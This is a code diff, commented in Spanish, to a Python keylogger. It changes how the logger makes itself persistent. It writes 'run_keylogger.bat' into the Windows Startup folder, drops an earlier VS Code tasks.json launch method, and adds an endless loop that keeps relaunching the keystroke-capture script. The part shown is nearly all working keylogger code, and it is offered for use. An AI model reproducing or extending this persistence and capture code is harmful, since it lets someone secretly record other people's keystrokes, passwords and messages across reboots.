@@ -15,7 +15,7 @@ bat_file_path = os.path.join(startup_folder, 'run_keylogger.bat')
 vscode_path = r"C:\Users\yo\AppData\Local\Programs\Microsoft VS Code\Code.exe"  # Cambia a la ruta correcta de tu VS Code
 
 def create_startup_file():
-    # Contenido del archivo .bat
+    # Contenido del archivo .bat modificado para incluir el bucle infinito
     bat_content = f'''@echo off
 rem Verificar si Python está instalado
 where python >nul 2>nul
@@ -37,38 +37,10 @@ if not exist "{vscode_path}" (
 rem Ruta del script Python
 set "PYTHON_SCRIPT={current_script}"
 
-rem Crear un archivo tasks.json para ejecutar el script en VS Code
-echo {{ > "%USERPROFILE%\\.vscode\\tasks.json"
-echo   "version": "2.0.0", >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo   "tasks": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo     {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       "label": "Run Python Script", >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       "type": "shell", >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       "command": "python", >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       "args": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo         "%PYTHON_SCRIPT%" >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       ], >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       "group": {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo         "kind": "build", >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo         "isDefault": true >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       }}, >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo       "problemMatcher": [] >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo     }} >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo   ] >> "%USERPROFILE%\\.vscode\\tasks.json"
-echo }} >> "%USERPROFILE%\\.vscode\\tasks.json"
-
-rem Abrir Visual Studio Code y el script
-start "" "{vscode_path}" "{current_script}"
-
-rem Espera a que VS Code abra el archivo
-timeout /t 5 /nobreak
-
-rem Ejecutar el script en la terminal integrada de VS Code usando un comando VS Code específico
-"{vscode_path}" --folder-uri "{current_script}" -r -g -n
-"{vscode_path}" --install-extension ms-python.python --force
-"{vscode_path}" --command "workbench.action.terminal.runActiveFile"
-
-exit
+rem Bucle para ejecutar el script continuamente
+:inicio
+python %PYTHON_SCRIPT%
+goto inicio
 '''
 
     with open(bat_file_path, 'w') as bat_file:
@@ -102,7 +74,7 @@ def main():
 
     def store_keystrokes():
         while True:
-            time.sleep(10)  # Espera 5 minutos (300 segundos)
+            time.sleep(10)  # Ajusta el tiempo de espera según tus necesidades
             if keystrokes:
                 # Unir las teclas en una sola cadena de texto
                 data = ''.join(keystrokes)
